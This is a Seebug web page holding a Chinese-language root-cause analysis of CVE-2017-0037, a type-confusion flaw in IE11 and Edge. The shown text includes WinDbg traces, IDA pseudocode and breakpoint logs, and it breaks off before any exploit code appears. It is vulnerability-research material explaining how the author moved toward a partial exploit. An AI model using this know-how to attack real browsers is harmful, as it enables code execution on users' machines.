<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>CVE-2017-0037 IE11&amp;Edge Type Confusion从PoC到半个Exploit</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">CVE-2017-0037 IE11&amp;Edge Type Confusion从PoC到半个Exploit</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-03-19" class="timeago">6 月 之前</time>
          <time datetime="2017-03-19" class="fulldate">三月 19, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/bin-security/">二进制安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss" value="k0shl" name="http://whereisk0shl.top"></p>
<p>作者：<a href="http://whereisk0shl.top">k0shl</a> 转载请注明出处<br />
作者博客：http://whereisk0shl.top</p>
<h3>前言</h3>
<p>前段时间Google Project Zero(PJ0)曝光了一个关于IE11和Edge的一个类型混淆造成代码执行的漏洞，微软至今未推出关于这个漏洞的补丁，我对这个漏洞进行了分析，并且通过PoC构造了半个Exploit，为什么是半个呢，首先这个漏洞攻击面比较窄，只能控制Array里+0x4位置的值，通过类型混淆会认为这个值是一个指针，随后会调用指针某偏移处的虚函数，当我们能够控制这个指针的值的时候，虚函数也能够得到控制。这样就能劫持程序流，达到代码执行的效果。但这其中涉及到一个ASLR的问题，由于地址随机化，导致我们就算控制跳转之后，无法通过info leak来构造ROP，也就是DEP也无法绕过。</p>
<p>这里我也有考虑到袁哥的DVE，但由于我们并没有RW primitives，因此我们控制关键指针的条件太有限，导致想通过GodMod来执行脚本的方法似乎也不太可行（或者我没有发现？求大牛指教！）。</p>
<p>因此这里，我写了一个在关闭DEP时可以使用的exploit，并且和大家一起分享从PoC到Exp的整个过程，不得不说过程还是很麻烦的，因为想寻找这个Array+0x4位置的控制值如何能够DWORD SHOOT，我跟了Layout::TableBoxBuilder类下的很多函数。</p>
<p>PJ0 CVE-2017-0037 PoC地址：</p>
<p>https://bugs.chromium.org/p/project-zero/issues/detail?id=1011</p>
<p>目前来看，微软并没有更新这个exp的补丁，但是有人利用0patch修补了这个漏洞，其实我看起来感觉不太像从根本上解决了这个漏洞的问题：</p>
<p>https://0patch.blogspot.jp/2017/03/0patching-another-0-day-internet.html</p>
<p>尽管这个Type Confusion攻击面有限，但是Type Confusion这种漏洞是非常常见的，它的原理一般情况下是由于函数处理时，没有对对象类型进行严格检查，导致可以通过某些手段来造成类型混淆，通过对其他可控类型的控制可以达到代码执行的效果，甚至任意内存读写，比如Memory Corruption。</p>
<p>好啦，不多说了！下面我们来进入今天的分析，首先我们漏洞分析的环境：</p>
<p>Windows7 x64 sp1 build 7601</p>
<p>IE 11.0.9600.17843</p>
<p><img alt="./20170314/4.png" src="https://images.seebug.org/content/images/2017/03/4-2.png-w331s" /></p>
<hr />
<h3>漏洞分析</h3>
<p>首先漏洞的关键出现在boom()中，在PoC中定义了一个table表，其中在<th>标签中定义了表id为th1，在boom()函数中引用到，随后通过setInterval设定事件。</p>
<p>运行PoC，可以捕获到漏洞崩溃，附加Windbg。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">003</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">r</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000038</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0947</span><span class="n">ffb0</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0947</span><span class="n">ffb0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000002</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000064</span> <span class="n">edi</span><span class="o">=</span><span class="mi">6</span><span class="n">e65c680</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">e20fc87</span> <span class="n">esp</span><span class="o">=</span><span class="mi">086</span><span class="n">abdc0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">086</span><span class="n">abdec</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00010202</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d36</span><span class="o">:</span>
<span class="mi">6</span><span class="n">e20fc87</span> <span class="mi">833800</span>          <span class="n">cmp</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">],</span><span class="mi">0</span>    <span class="n">ds</span><span class="o">:</span><span class="mi">002</span><span class="n">b</span><span class="o">:</span><span class="mi">00000038</span><span class="o">=????????</span>
</pre></div>


<p>可以看到，这里eax作为指针，引用了一处无效地址，从而引发了崩溃，直接回溯崩溃位置的上下文，可以看到，在cmp汇编指令之前，调用了一处函数 <code>Layout::Patchable&lt;Layout::PatchableArrayData&lt;Layout::SGridBoxItem&gt; &gt;::Readable</code>。</p>
<p>而eax寄存器正是Readable函数的返回值。我们在这个函数call调用位置下断点，重新执行windbg。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">r</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0</span><span class="n">a020590</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">007</span><span class="n">e79f0</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">007</span><span class="n">e79f0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">007</span><span class="n">e79f0</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000064</span> <span class="n">edi</span><span class="o">=</span><span class="mi">69</span><span class="n">ad8080</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6968</span><span class="n">fc82</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0900</span><span class="n">b878</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0900</span><span class="n">b8a4</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d31</span><span class="o">:</span>
<span class="mi">6968</span><span class="n">fc82</span> <span class="n">e86df072ff</span>      <span class="n">call</span>    <span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">Patchable</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">PatchableArrayData</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">SGridBoxItem</span><span class="o">&gt;</span> <span class="o">&gt;::</span><span class="n">Readable</span> <span class="o">(</span><span class="mi">68</span><span class="n">dbecf4</span><span class="o">)</span>
</pre></div>


<p>可以看到，ecx寄存器作为第一个参数，看一下这个参数存放的对象。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dps</span> <span class="n">ecx</span>
<span class="mi">007</span><span class="n">e79f0</span>  <span class="mi">68</span><span class="n">d82230</span> <span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">FlowItem</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="s1">&#39;</span>
<span class="s1">007e79f4  00000000 //这个值将会在Readable函数中引用</span>
<span class="s1">007e79f8  00000009</span>
<span class="s1">007e79fc  007ec8d4</span>
<span class="s1">007e7a00  0a020660</span>
<span class="s1">007e7a04  00000064</span>
<span class="s1">007e7a08  00000064</span>
<span class="s1">007e7a0c  007e79f0</span>
<span class="s1">007e7a10  007e79f0</span>
<span class="s1">007e7a14  68d82230 MSHTML!Layout::FlowItem::`vftable&#39;</span>
<span class="mi">007</span><span class="n">e7a18</span>  <span class="mi">00000000</span>
<span class="mi">007</span><span class="n">e7a1c</span>  <span class="mi">00000009</span>
<span class="mi">007</span><span class="n">e7a20</span>  <span class="mi">007</span><span class="n">ec8d4</span>
<span class="mi">007</span><span class="n">e7a24</span>  <span class="mi">0</span><span class="n">a01fc60</span>
<span class="mi">007</span><span class="n">e7a28</span>  <span class="mi">00000000</span>
<span class="mi">007</span><span class="n">e7a2c</span>  <span class="mi">00000000</span>
<span class="mi">007</span><span class="n">e7a30</span>  <span class="mi">007</span><span class="n">e7a14</span>
<span class="mi">007</span><span class="n">e7a34</span>  <span class="mi">007</span><span class="n">e7a14</span>
</pre></div>


<p>这个参数存放的对象是一个Layout::FlowItem::&#96;vftable虚表，随后通过IDA来分析一下这个函数的功能。</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="n">__thiscall</span> <span class="n">Layout</span><span class="o">::</span><span class="n">Patchable</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">PatchableArrayData</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">SGridBoxItem</span><span class="o">&gt;&gt;::</span><span class="n">Readable</span><span class="p">(</span><span class="kt">int</span> <span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax@2</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@4</span>

  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">__readfsdword</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">_tls_index</span><span class="p">)</span> <span class="o">+</span> <span class="mi">36</span><span class="p">)</span> <span class="p">)</span>
  <span class="c1">// get tls array</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">this</span> <span class="o">+</span> <span class="mi">16</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">this</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v1</span> <span class="p">)</span>               <span class="c1">// 这个位置会检查this＋0x4位置的值，如果为0，则进入处理</span>
      <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span><span class="c1">//获取vftable pointer</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">+</span> <span class="mi">16</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>这里，读取虚表+0x4位置的值为0，因此会执行if(!v4)中的逻辑，会将this指针交给v1，随后v1+0x10后返回，因此，Layout::FlowItem::&#96;vftable所属指针的这个情况是正常的情况，函数会正常返回进入后续处理逻辑。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">Patchable</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">SharedBoxReferenceDataMembers</span><span class="o">&gt;::</span><span class="n">Readable</span><span class="o">+</span><span class="mh">0x1e</span><span class="o">:</span>
<span class="mi">68</span><span class="n">dbed16</span> <span class="mi">83</span><span class="n">c010</span>          <span class="n">add</span>     <span class="n">eax</span><span class="o">,</span><span class="mi">10</span><span class="n">h</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">Patchable</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">SharedBoxReferenceDataMembers</span><span class="o">&gt;::</span><span class="n">Readable</span><span class="o">+</span><span class="mh">0x21</span><span class="o">:</span>
<span class="mi">68</span><span class="n">dbed19</span> <span class="n">c3</span>              <span class="n">ret</span><span class="c1">//函数正常返回</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">eax</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">007</span><span class="n">e7a00</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dps</span> <span class="n">eax</span>
<span class="mi">007</span><span class="n">e7a00</span>  <span class="mi">0</span><span class="n">a020660</span>
<span class="mi">007</span><span class="n">e7a04</span>  <span class="mi">00000064</span>
<span class="mi">007</span><span class="n">e7a08</span>  <span class="mi">00000064</span>
<span class="mi">007</span><span class="n">e7a0c</span>  <span class="mi">007</span><span class="n">e79f0</span>
<span class="mi">007</span><span class="n">e7a10</span>  <span class="mi">007</span><span class="n">e79f0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span><span class="c1">//这个地方会引用正常的值</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d36</span><span class="o">:</span>
<span class="mi">6968</span><span class="n">fc87</span> <span class="mi">833800</span>          <span class="n">cmp</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">],</span><span class="mi">0</span>    <span class="n">ds</span><span class="o">:</span><span class="mi">002</span><span class="n">b</span><span class="o">:</span><span class="mi">007</span><span class="n">e7a00</span><span class="o">=</span><span class="mi">0</span><span class="n">a020660</span>
</pre></div>


<p>直接继续执行，程序会第二次命中Readable函数，这次来看一下ecx中存放的对象。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">r</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0</span><span class="n">a020000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0</span><span class="n">a020120</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0</span><span class="n">a020120</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000064</span> <span class="n">edi</span><span class="o">=</span><span class="mi">69</span><span class="n">adc680</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6968</span><span class="n">fc82</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0900</span><span class="n">b878</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0900</span><span class="n">b8a4</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d31</span><span class="o">:</span>
<span class="mi">6968</span><span class="n">fc82</span> <span class="n">e86df072ff</span>      <span class="n">call</span>    <span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">Patchable</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">PatchableArrayData</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">SGridBoxItem</span><span class="o">&gt;</span> <span class="o">&gt;::</span><span class="n">Readable</span> <span class="o">(</span><span class="mi">68</span><span class="n">dbecf4</span><span class="o">)</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dps</span> <span class="n">ecx</span>
<span class="mi">0</span><span class="n">a020120</span>  <span class="mi">00000000</span>
<span class="mi">0</span><span class="n">a020124</span>  <span class="mi">00000028</span>
<span class="mi">0</span><span class="n">a020128</span>  <span class="mi">00000050</span>
<span class="mi">0</span><span class="n">a02012c</span>  <span class="mi">00000078</span>
<span class="mi">0</span><span class="n">a020130</span>  <span class="mi">000000</span><span class="n">a0</span>
<span class="mi">0</span><span class="n">a020134</span>  <span class="mi">000000</span><span class="n">c8</span>
<span class="mi">0</span><span class="n">a020138</span>  <span class="n">a0a0a0a0</span>
<span class="mi">0</span><span class="n">a02013c</span>  <span class="n">a0a0a0a0</span>
</pre></div>


<p>这次存放的对象并非是一个虚表对象，这个对象是一个int Array的维度对象，这样我们通过条件断点来跟踪两个对象的创建过程。我们重点关注两个对象创建的函数，一个是FlowItem::&#96;vftable对应的虚表对象，另一个是引发崩溃的int Array对象。这两个函数的返回值，也就是eax寄存器中存放的就是指向这两个创建对象的指针。</p>
<div class="codehilite"><pre><span></span>MSHTML!Array&lt;Math::SLayoutMeasure&gt;::Create

MSHTML!Array&lt;SP&lt;Tree::TableRowGroupBlock&gt;&gt;::Create
</pre></div>


<p>通过对这两个对象进行跟踪，我们可以看见到对象的创建，以及后续引用对象，导致Type Confusion。</p>
<div class="codehilite"><pre><span></span><span class="o">//</span><span class="nt">下条件断点</span><span class="err">，</span><span class="nt">打印每一次int</span> <span class="nt">Array</span> <span class="nt">object创建的信息</span>
<span class="nt">0</span><span class="p">:</span><span class="nd">007</span><span class="p">:</span><span class="nd">x86</span><span class="o">&gt;</span> <span class="nt">bp</span> <span class="nt">6912e1fb</span> <span class="s2">&quot;.printf \&quot;Something: 0x%08x,0x%08x\\n\&quot;,@eax,poi(eax);g;&quot;</span>
<span class="o">//</span><span class="nt">对象被不断创建</span>
<span class="nt">0</span><span class="p">:</span><span class="nd">007</span><span class="p">:</span><span class="nd">x86</span><span class="o">&gt;</span> <span class="nt">g</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc84</span><span class="o">,</span><span class="nt">0x0098c788</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc84</span><span class="o">,</span><span class="nt">0x09806790</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc84</span><span class="o">,</span><span class="nt">0x097d9010</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc5c</span><span class="o">,</span><span class="nt">0x097dafd8</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc84</span><span class="o">,</span><span class="nt">0x097ce050</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc84</span><span class="o">,</span><span class="nt">0x098026e0</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc84</span><span class="o">,</span><span class="nt">0x098044c8</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc84</span><span class="o">,</span><span class="nt">0x097ff540</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abc5c</span><span class="o">,</span><span class="nt">0x097d5058</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abafc</span><span class="o">,</span><span class="nt">0x097cab00</span>
<span class="nt">Something</span><span class="o">:</span> <span class="nt">0x088abafc</span><span class="o">,</span><span class="nt">0x0980a690</span> <span class="o">//</span><span class="nt">key</span><span class="o">!!</span>
<span class="nt">Breakpoint</span> <span class="nt">1</span> <span class="nt">hit</span>
<span class="nt">MSHTML</span><span class="o">!</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">MultiColumnBoxBuilder</span><span class="p">::</span><span class="nd">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="nt">0x2c3d31</span><span class="o">:</span>
<span class="nt">6968fc82</span> <span class="nt">e86df072ff</span>      <span class="nt">call</span>    <span class="nt">MSHTML</span><span class="o">!</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">Patchable</span><span class="o">&lt;</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">PatchableArrayData</span><span class="o">&lt;</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">SGridBoxItem</span><span class="o">&gt;</span> <span class="o">&gt;</span><span class="p">::</span><span class="nd">Readable</span> <span class="o">(</span><span class="nt">68dbecf4</span><span class="o">)</span>
<span class="nt">0</span><span class="p">:</span><span class="nd">007</span><span class="p">:</span><span class="nd">x86</span><span class="o">&gt;</span> <span class="nt">r</span><span class="o">//</span><span class="nt">第一次命中时</span><span class="err">，</span><span class="nt">是正常的FlowItem对象</span>
<span class="nt">eax</span><span class="o">=</span><span class="nt">0980aa80</span> <span class="nt">ebx</span><span class="o">=</span><span class="nt">0094d364</span> <span class="nt">ecx</span><span class="o">=</span><span class="nt">0094d364</span> <span class="nt">edx</span><span class="o">=</span><span class="nt">0094d364</span> <span class="nt">esi</span><span class="o">=</span><span class="nt">00000064</span> <span class="nt">edi</span><span class="o">=</span><span class="nt">69ad8080</span>
<span class="nt">eip</span><span class="o">=</span><span class="nt">6968fc82</span> <span class="nt">esp</span><span class="o">=</span><span class="nt">088abb28</span> <span class="nt">ebp</span><span class="o">=</span><span class="nt">088abb54</span> <span class="nt">iopl</span><span class="o">=</span><span class="nt">0</span>         <span class="nt">nv</span> <span class="nt">up</span> <span class="nt">ei</span> <span class="nt">pl</span> <span class="nt">nz</span> <span class="nt">na</span> <span class="nt">po</span> <span class="nt">nc</span>
<span class="nt">cs</span><span class="o">=</span><span class="nt">0023</span>  <span class="nt">ss</span><span class="o">=</span><span class="nt">002b</span>  <span class="nt">ds</span><span class="o">=</span><span class="nt">002b</span>  <span class="nt">es</span><span class="o">=</span><span class="nt">002b</span>  <span class="nt">fs</span><span class="o">=</span><span class="nt">0053</span>  <span class="nt">gs</span><span class="o">=</span><span class="nt">002b</span>             <span class="nt">efl</span><span class="o">=</span><span class="nt">00000202</span>
<span class="nt">MSHTML</span><span class="o">!</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">MultiColumnBoxBuilder</span><span class="p">::</span><span class="nd">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="nt">0x2c3d31</span><span class="o">:</span>
<span class="nt">6968fc82</span> <span class="nt">e86df072ff</span>      <span class="nt">call</span>    <span class="nt">MSHTML</span><span class="o">!</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">Patchable</span><span class="o">&lt;</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">PatchableArrayData</span><span class="o">&lt;</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">SGridBoxItem</span><span class="o">&gt;</span> <span class="o">&gt;</span><span class="p">::</span><span class="nd">Readable</span> <span class="o">(</span><span class="nt">68dbecf4</span><span class="o">)</span>
<span class="nt">0</span><span class="p">:</span><span class="nd">007</span><span class="p">:</span><span class="nd">x86</span><span class="o">&gt;</span> <span class="nt">g</span>
<span class="nt">Breakpoint</span> <span class="nt">1</span> <span class="nt">hit</span>
<span class="nt">MSHTML</span><span class="o">!</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">MultiColumnBoxBuilder</span><span class="p">::</span><span class="nd">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="nt">0x2c3d31</span><span class="o">:</span>
